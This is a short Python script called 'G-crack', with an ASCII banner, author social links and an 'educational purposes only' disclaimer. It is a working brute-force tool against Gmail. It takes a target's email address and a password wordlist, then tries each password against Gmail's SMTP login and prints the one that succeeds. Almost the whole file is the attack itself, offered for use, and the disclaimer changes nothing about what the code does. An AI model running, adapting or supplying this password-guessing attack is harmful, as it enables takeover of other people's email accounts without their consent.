#!/bin/python
# -*- coding: utf-8 -*- 

import smtplib
	
print('''  

        
    ad8888888888ba
   dP'         `"8b,
   8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
   8  8' `8           "8baaaad""""baaaad""""baad""8b         
   8  8   8              """"      """"      ""    8b
   8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P    
   8  `"""'       ,d8""
   Yb,         ,ad8"    G-crack  
    "Y8888888888P"

By: Liam Wood
Github: https://github.com/Shutdown-exe
Instagram: https://www.instagram.com/malware.255/                
             
This was made for EDUCATIONAL PURPOSES ONLY don't do anything ILLEGAL!!!!!

			            ''')
 

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter target's email: ")
passwfile = raw_input("File name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found: %s") % password
        break;
    except smtplib.SMTPAuthenticationError:
            print("[!] Password Incorrect: %s") % password
